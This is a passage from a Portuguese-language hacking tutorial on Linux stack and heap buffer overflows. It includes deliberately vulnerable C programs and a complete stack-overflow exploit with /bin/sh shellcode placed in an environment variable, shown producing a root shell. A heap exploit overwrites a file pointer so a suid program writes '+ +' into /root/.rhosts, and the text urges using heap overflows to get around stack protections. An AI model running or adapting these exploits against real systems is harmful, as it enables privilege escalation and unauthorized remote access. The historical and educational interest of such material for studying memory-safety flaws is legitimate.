dados(shellcode,nops)  num  lugar  e  depois  fazer   com  que  o  endereco   de
retorno(return address)  aponte p/  esse lugar,  aonde estao  os nossos  dados.O
lugar  onde   podemos  colocar   nossos  dados   eh  conhecido   como  "variavel
environment"(ao redor, ambiente, por perto), o  pessoal que meche a um pouco  de
tempo em linux  sabe do que  estou falando.De qualquer  forma, quando ocorrer  o
overflow, nos  colocaremos o  endereco dessa  variavel sobre  o return  address,
fazendo com que nosso codigo seja executado.
As variaveis environment sao armazenadas no  topo do Stack quando o programa  eh
iniciado, qualquer modificacao  pela funcao setenv()  - que serve  para mudar ou
adicionar uma  variavel environment  - eh  entao alocada  lah(no topo do stack).
Apos a inicializacao o stack ficaria parecido mais ou menos com isso:


<strings><argv aponta p/>NULL<envp aponta p/>NULL<argc><argv><envp>



Veremos entao um novo exemplo de programa bugado, soh que com um
pequeno buffer.Vejamos

------------------------------------------------------------------
/* SEGUNDO EXEMPLO DE PROGRAMA BUGADO.
   PROGRAMA BUGADO COM PEQUENO BUFFER */

#include <stdio.h>
#include <string.h>

#define TAMANHO      100

main(int argc, char *argv[])
{
char nick[TAMANHO];
char *digitado;
if(argc < 2){
printf("Programa bugado 2!!\n");
printf("Uso: %s <seu_nick>\n",argv[0]);
exit(0);
}
digitado = argv[1];
strcpy(nick,digitado);
if(!strcmp(nick,"hacko")){
printf("Seja bem vindo mestre!!\n");
return 0;
}
else{
printf("Fora daqui!!Voce eh Newbie!!\n");
printf("Somente hackos tem acesso na hora certa!!\n");
return 0;
}
}
-----------------------------------------------------------------

Compile ele normalmente: gcc -o bug2 bug2.c

Como voce pode ver,  ele possui apenas 100  bytes de tamanho no  buffer, poderia
ateh possuir menos para nossos  propositos educacionais, e voce pode  se deparar
com buffers menores por aih, mas trabalharemos em cima desse com 100 bytes  para
facilitar mais, lembrando novamente o que eu disse em outros tutoriais:
"SABENDO FAZER UM, O QUE TE IMPEDE DE FAZER TODOS?"

Abaixo segue o exploit para esse tipo de programa bugado:

----------------------------- expl5.c -------------------------------
/* Exploit para Segundo Programa Bugado.
   Ele irah criar uma variavel environment para
   sobrescrever um buffer pequeno */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Definimos o tamanho do buffer padrao, o tamanho do buffer
   aqui do nosso exploit nao precisa ser pequeno, o que eh
   aconselhavel eh definirmos o tamanho do buffer da variavel
   environment proximo ao do buffer bugado, por isso amigo,
   eh bom ter uma ideia, antes de exploitar um programa bugado,
   do tamanho do buffer que recebe dados, tente a velha forca
   bruta.Alinhamento, Offset e Nop, voce jah sabe. */

#define TAMANHO_BUFFER        500
#define NOP                  0x90
#define OFFSET_PADRAO           0
#define ALIGN                   0

/* Aqui entra a definicao do tamanho padrao do buffer onde ficarah
   nossa variavel environment, tente coincidir com o tamanho do buffer
   bugado, se nao for possivel, chute atraves da linha de comando. */

#define TAMANHO_VENV          100

unsigned long pega_sp(void){
__asm__("movl %esp, %eax");
}

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char *argv[])
{
char *buffer, *var_env;
long retaddr;
int i ,tamanho = TAMANHO_BUFFER, offset = OFFSET_PADRAO;
int tam_venv = TAMANHO_VENV ;

if (argc > 1) {
tamanho = atoi(argv[1]);
}
if (argc > 2) {
offset = atoi(argv[2]);
}
if(argc > 3){
tam_venv = atoi(argv[3]);
}

if(!(buffer = malloc(tamanho))){
fprintf(stderr,"Nao pode alocar mamoria!!\n");
exit(1);
}

/* Pegando o Endereco de Retorno */

retaddr = pega_sp() - offset;

/* Colocamos buffer no endereco de retorno */

for (i=0;i<tamanho;i+=4)
       {
                buffer[i+ALIGN]=(retaddr&0x000000ff);
                buffer[i+ALIGN+1]=(retaddr&0x0000ff00)>>8;
                buffer[i+ALIGN+2]=(retaddr&0x00ff0000)>>16;
                buffer[i+ALIGN+3]=(retaddr&0xff000000)>>24;
        }



/* Enchemos uma parte do buffer com NOP's
   Como pode notar, manipulamos nosso buffer em cima
   do tamanho da variavel environment, se ligue, se for
   chutar tamanhos, nao chute muito distantes um do outro
*/

for (i=0;i<(tam_venv-strlen(shellcode));i++)
   *(buffer+i) = NOP;

memcpy(buffer+i,shellcode,strlen(shellcode));

/* Setamos a Variavel Environment */

var_env[tam_venv -1] = '\0';

memcpy(var_env,"EGG=",4);
putenv(var_env);

/* Executamos o programa bugado */

execl("./bug2","bug2",buffer,0);

}
---------------------------------------------------------------

Compilamos ele normalmente e em seguida mandamos brasa:

[localhost:/]$ gcc -o expl5 expl5.c
[localhost:/]$ ./expl5 500 0 100
Fora daqui .....
úÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿú
úÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿ
úÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿ!!Voce eh Newbie!!
Somente hackos tem acesso na hora certa!!
Segmentation fault
[localhost:/]$ ./expl5 400 0 200
Fora daqui .....
úÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿú
úÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿ
úÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿúÿ!!Voce eh Newbie!!
Somente hackos tem acesso na hora certa!!
bash# exit
exit

:)...Como pode ver, tudo eh possivel amigo.Voce pode tentar, chutando o  tamanho
do buffer  p/ nosso  exploit de  360 a  410, mais  ou menos,  sem necessitar  de
offsets.Jah  o  tamanho do  buffer  da variavel  Environmente,  fica proximo  ao
tamanho do  buffer do  programa bugado,  algo entre  90 e  104, tente chegar bem
proximo do  tamanho do  buffer bugado,  aih voce  terah que  manipular somente o
tamanho do buffer do exploit(argv[1]).

Bem amigos, creio que isso eh o suficiente para se exploitar funcoes que recebem
dados da linha de comando, como nos dois exemplos acima, onde a funcao  strcpy()
manipulava dados recebidos diretamente pela linha de comando.Sabemos que nao sao
somente estas  as funcoes  que nao  checam o  tamanho dos  dados recebidos e sua
relacao  com o  tamanho do  buffer para  as variaveis,  sao varias,  e mais  lah
embaixo voce verah  algumas explicadas brevemente,  mas para enfatizar  que voce
estah apto  a explorar  falhas nas  funcoes que  nao checam  o tamanho dos dados
recebidos pela linha  de comando, colocaremos  mais um programa  bugado, soh que
com outra funcao que nao checa, a funcao sprintf.

/* PROGRAMA BUGADO 3, SPRINTF() */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define    TAMANHO   512

main(int argc, char *argv[]){
char *hacko;
char buf_bugado[TAMANHO];

if(argc < 2){
printf("Programa bugado 3!!\n");
printf("Uso: %s string\n",argv[0]);
exit(0);
}
hacko = argv[1];
sprintf(buf_bugado,"%s",hacko);
printf("Seja bem vindo %s!\n",buf_bugado);
return 0;
}


Voce pode  usar o  mesmo exploit  otimizado usado  para sobrescrever  o primeiro
programa  bugado,o exploit  de numero  4 para  esse programa  acima e  conseguir
exploita-lo.Aqui  no  meu  caso,  chutei  o tamanho  do  buffer  de  520  a 620,
conseguindo  exploitar  tranquilamente.Eh dificil  hj  em dia  se  achar codigos
contendo este  tipo de  bug(funcao sprintf()  usada deste  modo), voce  pode ver
claramente que o uso dela nao eh util, pois eh mais facil achar strcpy() fazendo
o que sprintf() fez acima.Mas eh bem capaz de voce achar num programa  sprintf()
sendo usado da seguinte forma:

sprintf(buf_bugado,"Seja bem vindo %s!\n",hacko);
printf(buf_bugado);


Aih  a  coisa  complica  um  pouco.Nao  vou  avancar  muito,  pois  pretendo, se
necessario, escrever uma continuacao para  este tutorial, mas antes deve  vir um
material sobre IPC(InterProcess Comunication), que um dos membros do  Unsekurity
Team estah processando..:).  Com IPC fica  mais facil interagir  com funcoes que
nao  recebem  dados  da linha  de  comando,  e consequentemente  exploita-las.Eh
possivel que ainda nao exista material divulgado sobre este tipo de  exploitacao
em linux,mas  que ela  eh possivel,  isso eh  fato!!!Voce pode  ver abaixo  este
programa bugado:

/* QUARTO PROGRAMA BUGADO PARA TUTORIAL SOBRE OVERFLOWS
   PROGRAMA BUGADO COM A FUNCAO SCANF().
*/

#include <stdio.h>
#include <stdlib.h>

main(){
char nome[12];
printf("Digite seu nome:");
scanf("%s",&nome);
printf("Seja bem vindo %s!\n",nome);
}


Voce  pode  ver  claramente  que   a  funcao  scanf()  acima  nao   checa  dados
recebidos.Mas neste exemplo nao empurraremos  dados pela linha de comando,  isso
eh um pequeno problema que o pessoal que manja de IPC jah sabe resolver, mas  um
grande problema.Soh encontrei um documento que falasse algo sobre exploitacao de
um buffer via IPC na internet, mesmo assim, nada claro.Lembrando que quando falo
exploitacao via IPC, nao tou me referindo a buffer remotos nao, via socket,  tou
me referindo ao programa acima.Talvez exista ateh um metodo melhor que  isto,nao
sei.Teste para ver se esse programa eh bugado, usando o gdb, como no esquema lah
do comeco. Assim que sair o tutorial sobre IPC, a gente avanca mais nesse ponto.
Quanto ao codigo  de sprintf() acima,  nao faz-se necessario  IPC para exploitar
ele, soh necessita de uma manha para  que o endereco de retorno caia numa  parte
do buffer que execute nossa shell.Vou  deixar para depois tambem, isso aqui  jah
tah grande mais, e tah meio avancado demais.Fica aih os conceitos, espero quando
publicar a  continuacao deste  txt voce  nao precisar  mais dos  dados que  nele
estarao referentes a Stack Overflows,  pois espero que esteja jah  dominando boa
parte dessa tecnica.

Encerramos por aqui, essa fase inicial sobre Stack Overflows, veremos agora algo
parecido  com  Stack Overflows,  mas  que eh  muito  util hoje  em  dia, o  Heap
Overflow.


-------------------------
6 - O HEAP - A NOVA ERA? |
-------------------------

Como podemos ver acima,estah mais do  que provado que a regiao denominada  Stack
pode ser usada atraves de estouro de buffer para execucao de codigos arbitrarios
ou mais conhecidos como shellcodes (codigos de shell).Quando a pratica de  Stack
Overflows foi  sendo cada  vez mais  difundida, o  time da  seguranca tratou  de
tentar  contra-atacar.  Pensaram  e  estudaram  ateh  encontrar  uma  "forma" de
dificultar  a  execucao  de  codigo  arbitrario  via  Stack  Overflow.Criaram um
programa capaz  de manter  vigilancia no  Stack e  impedir a  execucao de codigo
arbitrario,  sao  os   chamados  Stack  Guards.Nao   sao  tao  eficientes,   mas
determinados tipos de vulnerabilidades nao podem ser mais exploitadas via  Stack
Overflows.No momento tambem sao poucos os  programas deste tipo, e eu mesmo  soh
possuo o conhecimento de dois, o Stack Guard p/ estacoes sun/solaris, e um recem
criado,  conhecido  como  Stack  Shield,  sendo  este  ultimo  para  plataformas
linux.Devem existir bem mais por aih, e se de alguma forma isto se  concretizar,
logo logo estarao acoplados as distribuicoes de sistemas operacionais.Mas,  como
vimos no inicio, existem outras regioes  de memoria, e dentre estas, uma  possui
uma  particularidade  interessante,  eh   a  regiao  BSS.  Podemos   visualizada
virtualmente no desenho do item 1.3 deste arquivo texto.Ateh o presente momento,
nao foi divulgada ainda uma possivel protecao a essa regiao da memoria contra os
buffers overflows,nesse caso  conhecido como heap  overflows ou heap  baseado em
bss overflows. Heap overflows, ao  contrario dos Stack overflows, nao  sao muito
conhecidos, sao  pouquissimos os  textos que  ensinam algo  sobre isso,  mas nao
desanime amigo, porque entendo bem os overflows  em Stack e um pouco mais de  C,
voce  poderah  perfeitamente  entender  e  consequentemente  praticar  isto aqui
tambem.Entao amigo, quando  voce se deparar  com um sistema  que possui protecao
contra "Stack Overflows", nao pense duas vezes, tente "heap Overflows",  porque,
como vimos no desenho do cap 1.3, heap  pode ser usado p/ exploitar o stack e  a
bss,  e  ateh mesmo  passar  por cima  de  uma dessas  protecoes  de Stack  aih,
lembrando que, o autor desse txt nao  faz parte do time de seguranca, vai  ver a
situacao ainda eh pior do que a descrita aqui, por mim!!:)


6.1 - Alocacao Dinamica em C
-----------------------------

Irei aqui dar uma breve explicacao de como eh feita a alocacao dinamica de dados
em C.Lembrando que  nao eh intuito  deste tutorial ensinar  C ou qualquer  outra
linguagem, fique atento a atual home  page do grupo Unsekurity Team, sempre  tem
algo relacionado a programacao  por lah. A alocacao  dinamica em C tem  diversas
utilidades,  uma delas  eh a  criacao de  listas de  informacoes de  comprimento
veriavel, muito  utilizadas em  aplicacoes de  banco de  dados, eis  aih um  dos
motivos de  se preferir  um BD  feito a  mao, do  que lixos  como oracle,mysql e
etc..Mas isso fica  para outra oportunidade,  no momento, tenhamos  em mente que
para manipularmos  dados na  regiao BSS,  onde usaremos  nossos Heap  Overflows,
necessitamos saber este conceito de  Alocacao Dinamica.Isso pode servir para  um
futuro breve, mano!! O sistema de alocacao dinamica do C, contem muitas funcoes,
mas as mais importantes e mais usadas sao malloc() e free(), tambem se usa muito
calloc().A  alocacao  dinanica  permite  ao  programador   alocar  memoria  para
variaveis quando o programa estah  sendo executado. Isso poderah ser  muito util
em aplicacoes IPC visando escrita em buffers que nao recebem dados pela linha de
comando.Mas aguarde!! Um simples exemplo de alocacao dinamica segue abaixo:

#include <stdio.h>
#include <stdlib.h>

#define   A     0x41

main (void) {

static char  *buffer, string[300];
int tamanho,i;

tam = 200;
if((buffer=(char *)malloc(tam)) == NULL){
      fprintf (stderr,"Erro: Nao pode alocar memoria!!\n");
      exit(1);
 }

for (i=0; i<tam ; i++)
buffer[i] = A;

strcpy(string,buffer);
printf("Eis aih a string mano: %s !!\n",string);
return 0;
}


Esse eh um exemplo simples.O que malloc() fez acima foi tornar *buffer um  vetor
de "tam"  posicoes, e  alocou um  buffer do  tamanho de  "tam".De cara voce pode
perceber algumas coisas, a  variavel tam no caso  acima, possui tamanho igual  a
200, enquanto malloc aloca um espaco  de 300 bytes para buffer, eh  evidente que
sobra espaco  em buffer,  mas se  ao inves  de 200  em tamanho,  colocarmos, por
exemplo, 330.Veja voce mesmo o resultado obtido, nossa boa e velha resposta:

Segmentation fault

O que voce acaba de fazer amigo, eh o que chamamos de Heap Overflow.
Olhe um fonte para isso aih abaixo:

----------------------------heapbug1.c-------------------------------
/* Exemplo de programa bugado a Heap Overflow */

#include <stdio.h>
#include <stdlib.h>

#define   A     0x41

main (int argc, char *argv[]) {

static char  *buffer, *string;
int tamanho,i;

if(argc < 2){
printf("Primeiro Programa bugado para Heap Overflow!\n");
printf("Uso: %s <tamanho_buffer>\n",argv[0]);
exit(0);
}

tamanho = atoi(argv[1]);
if((buffer=(char *)malloc(tamanho)) == NULL){
      fprintf (stderr,"Erro: Nao pode alocar memoria!!\n");
      exit(1);
 }
if((string=(char *)malloc(tamanho - 50)) == NULL){
      fprintf (stderr,"Erro: Nao pode alocar memoria!!\n");
      exit(1);
 }
for (i=0; i<tamanho ; i++)
buffer[i] = A;

strcpy(string,buffer);
printf("Eis aih a string mano: %s !!\n",string);
return 0;
}
---------------------------------------------------------------------

Voce pode notar  acima que ambos  os ponteiros(*strings e  *buffer) sao alocados
dinamicamente na memoria,  e um(buffer) sobrescreve  o outro(string). O  exemplo
acima eh soh demontrativo, nao  vah escrever exploit para ele  nao mano!!:).Mais
abaixo voce verah um programa bugado que podemos tirar proveito.


-------------------
7 - HEAP OVERFLOWS |
-------------------

Heap Overflows sao bastante semelhantes a Stack overflows, onde:

* Ambos exploram a vulnerabilidade de funcoes que nao checam
  o tamanho dos dados injetados sobre um buffer, ou simplesmente,
  permitem que se coloque mais dados num buffer do que ele
  permite aceitar;

* Ambos podem explorar a area da memoria conhecida como Stack, mas
  somente os Heap Overflows podem sobrescrever buffer na regiao
  conhecida como BSS.

* Ambas podem ser usadas para inserir codigos maliciosos na intuicao
  de conseguir acesso a dados, sistemas, execucao de programas e etc;

* Ambas podem ser usadas remotamente;

* Dependendo do nivel de programacao do fucador, pode-se exploitar
  qualquer funcao que nao checa o tamanho dos dados inseridos num
  buffer para execucao de codigo malicioso como o dono do programa;

Como podemos ver, a teoria  aplicada ao Stack Overflow, eh  bastante compativel,
mas voce deve me perguntar, entao onde estah a diferenca?? Diferente do primeiro
caso(Stack  Overflows),  os dados  em  Heap Overflows  nao  serao empurrados  no
Stack(podem ateh  ser, mas  aqui nao  abordarei dessa  forma), e  sim na  regiao
conhecida  como  BSS,  atraves  de  funcoes  que  nos  permitem  alocar  memoria
dinamicamente.Nos  nossos exemplos  tambem exploitaremos  programas bugados  que
guardam seus dados na BSS, e nao no Stack.Aih estah uma diferenca  consideravel,
porque mesmo que o  sistema alvo nao possuia  protecao no Stack, de  que adianta
voce  tentar  exploitar  um  programa(funcao),  se  ele  nao  armazena  lah suas
informacoes? De qualquer  modo, o conhecimento  de heap overflows,  creio eu, se
faz necessario para tempo futuro, como descrevi acima, talvez em breve nao  seja
mais possivel Stack Overflows, aih mano, voce terah que saber disso daquih  mais
cedo ou mais tarde. Tomei  conhecimento quando escrevia este texto  que apareceu
mais  um patch  para kerneis  contra buffer  overflows, algo  que tenta  limitar
execucao  de programas  com uid  0, uma  especie de  getuid() melhorado,  fiquem
atentos  a  isso, agora  mais  do que  nunca  a uniao  e  pesquisa, bem  como  a
divulgacao  de  resultados  obtidos,   se  faz  necessario,  visando   um  maior
conhecimento de todos frente a  estes patchs.Nao tenho confirmacao disso  ainda,
mas  tou colocando  jah aqui,  pois com  certeza um  dia isso  vai aparecer,  ao
contrario do que dizem, temos  bons profissionais de seguranca, muita  gente jah
se vendeu, mas de qualquer forma, eles continuam sendo bons.Mas continuando.

Bem, um conhecimento maior de  C, vai ser necessario agora.Vamos  comecar usando
Heap  Overflows  para  sobrescrever  ponteiros.Heap  Overflows  que sobrescrevem
ponteiros sao considerados o mais primitivo metodo de escrita de heap overflows,
pois pode-se usar este metodo para  sobrescrever um arquivo, como por exemplo  o
arquivo passwd.Abaixo segue  um exemplo basico  de como se  manipular ponteiros,
descrito  por  Matt  Conover,  do  grupo  w00w00,  em  seu  tutorial  sobre Heap
Overflows, vale  mais do  que uma  olhada, veja  em "www.w00w00.org"  o tutorial
completo.Prosseguindo:

 /* Demonstracao de static pointer overflow em bss (uninitialized data)
    Desenvolvido por Matt Conover, descrito em seu tutorial sobre
    Heap Overflows.
    Alterado por Nash Leon para uso neste Tutorial.
*/

   #include <stdio.h>
   #include <stdlib.h>
   #include <unistd.h>
   #include <string.h>
   #include <errno.h>

/* Define tamanho do buffer que serah usado para sobrescrever */

   #define BUFSIZE 16
/* Define tamanho de bytes em um endereco */
   #define ADDRLEN 4

   int main()
   {
    u_long diff;
      static char buf[BUFSIZE], *bufptr;

      bufptr = buf, diff = (u_long)&bufptr - (u_long)buf;

      printf("bufptr (%p) = %p, buf = %p, diferenca = 0x%x (%d) bytes\n",
      &bufptr, bufptr, buf, diff, diff);

      memset(buf, 'A', (u_int)(diff + ADDRLEN));

      printf("bufptr (%p) = %p, buf = %p, diferenca = 0x%x (%d) bytes\n",
             &bufptr, bufptr, buf, diff, diff);

      return 0;
   }

Compile-o normalmente e depois execute-o, voce irah receber algo parecido
com as linhas abaixo:

bufptr (0x80496b8) = 0x80496a8, buf = 0x80496a8, diferenca = 0x10 (16) bytes
bufptr (0x80496b8) = 0x41414141, buf = 0x80496a8, diferenca = 0x10 (16) bytes

O que podemos perceber  acima eh que o  ponteiro no fim aponta  para um endereco
diferente de memoria  que apontava no  inicio.O que se  pode fazer com  isso, eh
aproveitar uma  vulnerabilidade  onde  nos possamos  sobrescrever algum  arquivo
temporario para apontar para uma  string separada(como por exemplo um  parametro
em argv[1]  que nos  mesmos possamos  prover), que  possa conter algo malicioso,
como "/root/.rhosts".

Para demontrar  isto, iremos  dar uma  olhada em  um programa  bugado com  estas
caracteristicas,iremos usar um arquivo temporario para momentanea- mente  salvar
dados colocados(input) de algum usuario.O programa abaixo tambem foi escrito por
Matt Conover, e tambem pode ser obtido em www.w00w00.org, bem como seu  tutorial
sobre Heap Overflows que estou me baseando.

----------------------------heapvul1.c--------------------------------

   /*
    * Este eh um tipico programa vulneravel.Ele irah armazenar dados
    * de entrada(input) em um arquivo temporario.
    * Desenvolvido por Matt Conover.
    * Alterado por Nash Leon.
    * Compile com: gcc -o vulprog1 vulprog1.c
    */

   #include <stdio.h>
   #include <stdlib.h>
   #include <unistd.h>
   #include <string.h>

  #define BUFSIZE 16

   /*
    * Rode este vulprog como root para que tenha permissao para escrever
    * o /root/.rhosts , ou entao adapte-o para o usuario que se encontra.
    */

   int main(int argc, char **argv)
   {
      FILE *tmpfd;
      static char buf[BUFSIZE], *tmpfile;

      if (argc <= 1)
      {
         printf("Uso: %s <lixo>\n", argv[0]);
         exit(0);
      }

      tmpfile = "/tmp/vulprog.tmp"; /* Este nao eh o arquivo temporario
                                        vulneravel. */
      printf("antes: tmpfile = %s\n", tmpfile);
      printf("Digite uma linha de dados para colocar em %s: ", tmpfile);
      gets(buf);
      printf("\napos: tmpfile = %s\n", tmpfile);

      tmpfd = fopen(tmpfile, "w");
      if (tmpfd == NULL)
      {
         fprintf(stderr, "Erro abrindo %s: %s\n",tmpfile,strerror(errno));
         exit(1);
      }

      fputs(buf, tmpfd);
      fclose(tmpfd);
   }

------------------------------------------------------------------------

Compila esse programa bugado e depois seta ela como suid.
(Como root digite: chmod +s heapvul1)

Abaixo segue um exploit para este programa bugado, tambem feito por
Matt Conover, para variar.

-----------------------------heexpl1.c---------------------------------

  /*
   * Copyright (C) January 1999, Matt Conover & WSD
   *
   * Alterado por Nash Leon.
   *
   * Este exploit vai passar alguns argumentos para o programa(que o
   * programa vulneravel nao usa), exploitando o mesmo.O programa
   * vulneravel espera que nos digitemos uma linha de dados de entrada,
   * para ser armazenada temporariamente.Todavia, por causa de um
   * static buffer overflow, nos podemos sobrescrever o arquivo
   * temporario apontado, para que ele aponte para argv[1](que nos
   * devemos passar como "/root/.rhosts").Entao ele irah escrever nossa
   * linha temporaria para este arquivo.Entao nos sobrescrevemos a string,
   * (que nos iremos passar como nossa linha de entrada de dados) para que
   * seja:
   * + + # tamanho de (endereco tmpfile) - (endereco de buf) # de A's |
   *       endereco de argv[1]
   *
   *
   * Nos usamos "+ +", permite todos os hosts, seguido por '#' , que eh
   * usado para comentarios em shell scripts, para previnir que nosso
   * "codigo de ataque" cause problemas.Sem a "#", programas usando
   * .rhosts devem interpretar mal nosso codigo de ataque.
   *
   * Compile com: gcc -o exploit1 exploit1.c
   */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define BUFSIZE 256

#define DIFF 16 /* Diferenca estimada entre buf/tmpfile em heapvul1 */

#define VULPROG "./heapvul1"
#define VULFILE "/root/.rhosts" /* o arquivo 'buf' que serah armazenado */

/* Pega o valor de Stack Pointer(sp) fora do Stack.(Usado para
   calcular o endereco de argv[1] */

   u_long getesp()
   {
      __asm__("movl %esp,%eax"); /* equiv. de 'return esp;' em C */
   }

int main(int argc, char **argv)
   {
      u_long addr;

      register int i;
      int mainbufsize;

      char *mainbuf, buf[DIFF+6+1] = "+ +\t# ";

      /* ------------------------------------------------------ */
      if (argc <= 1)
      {
         fprintf(stderr, "Uso: %s <offset> [tente 310-330]\n", argv[0]);
         exit(1);
      }
      /* ------------------------------------------------------ */

memset(buf, 0, sizeof(buf)), strcpy(buf, "+ +\t# ");

memset(buf + strlen(buf), 'A', DIFF);
addr = getesp() + atoi(argv[1]);

/* reverse byte order (em um sistema little endian) */

for (i = 0; i < sizeof(u_long); i++)
buf[DIFF + i] = ((u_long)addr >> (i * 8) & 255);

mainbufsize = strlen(buf) + strlen(VULPROG) + strlen(VULPROG) +
strlen(VULFILE) + 13;

mainbuf = (char *)malloc(mainbufsize);
memset(mainbuf, 0, sizeof(mainbuf));

snprintf(mainbuf, mainbufsize - 1, "echo '%s' | %s %s\n",
               buf, VULPROG, VULFILE);

printf("Sobrescrevendo tmpaddr p/ apontar p/ %p, check %s depois.\n\n",
             addr, VULFILE);

   system(mainbuf);
      return 0;
}


---------------------------------------------------------------------

Compila ele e executa.Olha, ele mandou tentar offsets de 310 a 330, mas
eu soh consegui chutando 379, voce pode ir chutando, e vendo o que
aparece em "apos: tmpfile =".Veja meu exemplo abaixo:

[localhost:/]$ ./heexpl1 350
Sobrescrevendo tmpaddr p/ apontar p/ 0xbffffb56, check /root/.rhosts
depois.

antes: tmpfile = /tmp/vulprog.tmp
Digite uma linha de dados para colocar em /tmp/vulprog.tmp:
apos: tmpfile =
erro abrindo : No such file or directory

[localhost:/]$ ./heexpl1
Sobrescrevendo tmpaddr p/ apontar p/ 0xbffffb74, check /root/.rhosts
depois.

antes: tmpfile = /tmp/vulprog.tmp
Digite uma linha de dados para colocar em /tmp/vulprog.tmp:
apos: tmpfile = root/.rhosts
erro abrindo root/.rhosts: No such file or directory

Preste atencao acima, o "apos: tmpfile = root/.rhosts" indica que
o ponteiro estah bem proximo de alcancar o endereco que queriamos.

[localhost:/]$ ./heexpl1 379
Sobrescrevendo tmpaddr p/ apontar p/ 0xbffffb73, check /root/.rhosts
depois.

antes: tmpfile = /tmp/vulprog.tmp
Digite uma linha de dados para colocar em /tmp/vulprog.tmp:
apos: tmpfile = /root/.rhosts


Pronto!!O arquivo foi escrito com sucesso!!Chute offsets de 5 em 5,
prestando sempre atencao no que apareco na linha
"apos: tmpfile = /root/.rhosts", veja que no ultimo exemplo ele
nao apresentou mensagem de erro.Se voce me pergunta se isso pode ser
melhorado??? Pode sim, lembre-se que ele diz acima que usa 1 metodo
para pegar o 'return address', voce conhece varios metodos, incremente
um seu, e verah melhoras consideraveis neste exploit.

A funcao vulneravel do programa "heapvul1" descrito, eh a funcao gets(),
como muitas, ela tambem nao faz checagem no tamanho de buffer que
recebe.
Talvez voce esteja achando tudo isso muito dificil, nao vou me
aprofundar, isso foi soh para que voce tenha uma ideia, no proximo,
talvez explique mais detalhado isso tudo,de uma olhada nesse txt do
Matt Conover, ele eh um dos poucos disponiveis.


--------------------
8 - O PROJETO OMEGA |
--------------------

Irei descrever de forma  breve, o que se  trata este "Projeto", nao  entrarei em
detalhes tecnicos por enquanto, pois foge do intuito deste tutorial, haja visto,
nao considero simples as demonstracoes praticas desta tecnica.O que se  pretende
com isto, eh a eliminacao da necessidade de se chutar offsets, isso que  fazemos
muito.Existem tecnicas de forca bruta, que faz com que programas facam isso  por
nos, a gente deixa lah e ele  fica rodando o exploit, chutando offsets ateh  que
consiga nosso objetivo, mas esse projeto omega eh diferente, tem em mente acabar
com a necessidade de chutar offsets.No inicio, como sempre, muita gente nao  deu
ideia ao cara  que veio com  essa teoria, ele  eh conhecido como  "lamagra", mas
parece  que  agora o  pessoal  anda vendo  que  ele tem  razao.Recentemente  foi
publicado num  zine de  grande circulacao,  o HWA  zine, que  pode ser obtido em
www.csoft.net/~hwa , uma materia contendo material feito por esse lamagra para o
zine "core  zine", que  pode ser  baixado na  propria home  page do  lamagra, em
http://bounce.to/unah16/.
Eu nao sei precisar mais dados sobre  isso, mas creio que existe um porem,  como
tem aparecido patchs  e programas no  intuito de evitar  buffer overflows, creio
que o  proprio conceito  de buffer  overflows como  tecnica de  ataque estah  em
jogo.Sabemos que nao existe somente estah tecnica, mas creio que o  conhecimento
desta eh essencial.O esforco do lamagra eh valido, e creio que devemos sim medir
esforcos para termos  dominio sobre essa  teoria e consequentemente  pratica-la.
Caso seja possivel, num futuro txt sobre overflows, incluirei uma parte  tecnica
destinada a  este projeto.Mas  por enquanto,  caso queira  conferir, leia o zine
"core zine", de numeros 02 e 03, e verah algo sobre essa teoria e muitas  outras
coisas interessantes, tem ateh um tutorial sobre stack overflows, na versao  01,
se nao me engano. Sem mais sobre isso por enquanto.


---------------------
9 - PROCURANDO FUROS |
---------------------

Existem varios metodos para ver se um programa eh bugado ou nao.
Irei enumerar apenas alguns.
Sabemos  que um  programa para  ser vulneravel  a um  buffer overflow  necessita
possuir  um bug(uma  falha), em  seu codigo  ou implementacao,  que permita  que
causemos um  desvio do  curso normal  do programa  atraves do  enchimento de  um
buffer usado por uma funcao que  nao faz checagem de tamanho dos  parametros que
recebe.Sao varias as funcoes em C que podem ser vulneraveis a buffer  overflows,
mas dependendo da implementacao, uma funcao considerada "bugada" pode muito  bem
fazer uma checagem do  tamanho dos dados que  recebe e nao ser  mais considerada
bugada.Um exemplo disso segue abaixo:

scanf("%s ", variavel);

scanf("%500s ", variavel);


Se variavel  foi declarada  para receber  ateh 512  bytes, no  primeiro caso, se
digitarmos mais de  512, conseguiremos um  buffer overflow, mas  no segundo caso
nao, pois existe uma checagem dos parametros recebidos por scanf().

Muitas funcoes possuem funcoes substitutas, que sao funcoes que efetuam a  mesma
operacao da funcao considerada "bugada"( por nao fazer a checagem do tamanho dos
parametros que recebe) mas que checam o tamanho.

Vemos um exemplo disso nas funcoes abaixo:

strcat(variavel, buffer);

strncat(variavel, buffer,sizeof(buffer));

Se "variavel" possui  um tamanho maior  do que o  de "buffer", no  primeiro caso
teremos sim uma possivel condicao de buffer overflow,caso coloquemos mais  dados
do que buffer possa suportar; mas  no segundo caso, strncat faz uma  checagem do
tamanho de buffer antes de concatenar com variavel.


O melhor metodo  para saber se  um programa eh  vulneravel ou nao  eh atraves da
leitura de seu codigo-fonte.Eu disse no inicio desse txt que poderiamos saber se
um  programa  eh  vulneravel  a  overflow  atraves  do  recebimento  da mensagem
"Segmentation Fault",  mas isso  por sih  soh nao  basta, pois  muitos programas
possuem  erros que  geram o  recebimento desta  mensagem. Voce  pode sim  tentar
